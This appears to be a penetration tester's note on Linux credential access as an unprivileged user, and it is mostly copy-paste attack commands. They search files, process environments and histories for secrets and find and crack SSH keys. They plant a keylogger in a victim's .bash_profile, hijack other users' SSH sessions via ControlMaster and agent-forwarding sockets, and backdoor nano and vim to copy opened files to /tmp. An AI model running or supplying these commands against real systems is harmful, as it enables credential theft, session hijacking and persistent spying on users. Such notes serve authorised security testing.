---
title: Unprivileged Linux Credential Access
---

[[notes/mitre-attack/credential-access]] as normal user on [[notes/linux/index]].

Also check [[notes/linux/credential-access-admin]], maybe something is misconfigured.

Shell and other histories.

~~~ bash
cat ~/.bash_history
ls -ld /home/*/.*hist* /home/*/.*hsts*
~~~

Secrets in environment variables and program command lines.

~~~ bash
env || cat /proc/self/environ
cat /proc/*/environ
cat /proc/*/cmdline
~~~

Database passwords in web app configs.

~~~ bash
grep -ir --color passw /var/www/html/
~~~

Potential secrets in files.

~~~ bash
find / -type f -readable '(' -name '*id*' -or -name '*key*' -or -name '*passw*' -or -name '*secret*' -or -name '*token*' ')' ! -path '/sys/*' ! -path '/proc/*' ! -path '/dev/*' 2> /dev/null | sort
grep -ril -D skip 'id|key|passw|secret|token' / 2> /dev/null | sort | uniq
~~~

Potential hashes in files.

~~~ bash
grep -ir -D skip '[0-9a-f]{32,}' /
~~~

Secrets in logs (requires elevated privileges).

~~~ bash
grep -Fi passw /var/log/syslog
~~~

"Hidden" files.

~~~ bash
find / ! -type l ! -path '/sys/*' ! -path '/proc/*' ! -path '/usr/src/*' -name '.*' -ls 2> /dev/null
~~~

Paths readable by the current user.

~~~ bash
find / -readable -type f ! -path '/usr/*' ! -path '/bin/*' ! -path '/lib/*' ! -path "$HOME/*" ! -path '/sys/*' ! -path '/proc/*' ! -path '/var/lib/lxcfs/cgroup/*' -ls 2> /dev/null
~~~

Use `script` as builtin key logger.

~~~ bash
echo 'exec script -qc $SHELL /tmp/7cc62021.tmp' >> /home/victim/.bash_profile
~~~

Untested tools:

- [LaZagne](https://github.com/alessandroz/lazagne), extracts secrets from browsers and many other applications, Python

# SSH

Search for SSH private keys.

~~~ bash
ls -la /home/*/.ssh/
find / ! -path '/dev/*' ! -path '/proc/*' ! -path '/sys/*' -type f '(' -iname 'id_*' -or -iname '*.key' ')' -ls 2> /dev/null
grep -lrE 'BEGIN.*?PRIVATE KEY' /home 2> /dev/null
~~~

If you found a key check the `~/.ssh/known_hosts` and `~/.bash_history` to see where you can authenticate with the key.

Try to crack password protected keys.

~~~ bash
ssh2john ./jdoeadm.key > ./jdoeadm.txt
john --wordlist=$HOME/pentesting/cracking/rockyou.txt ./jdoeadm.txt
~~~

## SSH Hijacking with ControlMaster

Hijack SSH connections that are initiated by other users on the current system.

~~~ bash
# as user
cat << 'EOF' >> ~/.ssh/config
Host *
  ControlPath /tmp/.ssh-%r@%h:%p.sock
  ControlMaster auto
  ControlPersist 15m
EOF
# as root
cat << 'EOF' >> /etc/ssh/ssh_config
Host *
  ControlPath /tmp/.ssh-%r@%h:%p.sock
  ControlMaster auto
  ControlPersist 15m
EOF
~~~

Use the *Control Master* socket of somebody else.

~~~ bash
ssh -S /tmp/.ssh-jdoe@srv01:22.sock jdoe@srv01
~~~

## SSH Hijacking using SSH Agent Forwarding

Connect to all systems that a user that is connected to the current system and has enabled *Agent Forwarding* has access to.

Find SSH agent sockets.

~~~ bash
grep -ahoP 'SSH_AUTH_SOCK=.*?\x00' /proc/*/environ 2> /dev/null | sort -Vu
ps aux | grep ssh
~~~

Use the agent socket of another user.

~~~ bash
export SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380
ssh-add -l
ssh jdoe@srv01
~~~

# Kerberos

Search for Kerberos TGTs.

~~~ bash
klist
echo $KRB5CCNAME
ls -la /tmp/krb5cc_*
~~~

# Backdoor Editors

Place the following snippet in `~/.nanorc` or `/etc/nanorc` to make `nano` copy all files opened in it to a public directory ([source](https://twitter.com/Alh4zr3d/status/1632255613840547840)).

~~~
set backup
set backupdir /tmp/.nano
set allow_insecure_backup
~~~

Place the following snippet in `~/.vim/plugin/zz.vim` to make `vim` copy all files opened in it to a public directory.

~~~
if $USER == "root"
  autocmd BufWritePost * :silent :w! >> /tmp/.vimlog
endif
~~~
